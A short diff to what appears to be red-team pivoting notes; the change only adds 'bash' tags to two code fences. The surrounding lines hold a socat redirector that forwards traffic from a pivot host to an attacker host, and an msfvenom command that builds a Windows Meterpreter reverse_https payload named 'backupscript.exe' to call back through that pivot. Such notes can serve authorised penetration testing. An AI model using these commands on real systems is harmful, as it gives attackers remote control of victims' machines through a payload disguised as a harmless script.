@@ -4,7 +4,7 @@
 ---
 ## Socat Redirector
 
-```
+```bash
 socat TCP4-LISTEN:8080,fork TCP4:<lhost>:80
 ```
 
@@ -13,7 +13,7 @@ Start the socat listener on the pivot host. Listens on port `8080` and forwards 
 ---
 ## Payload Generation
 
-```
+```bash
 msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<pivot> LPORT=8080 -f exe -o backupscript.exe
 ```
 
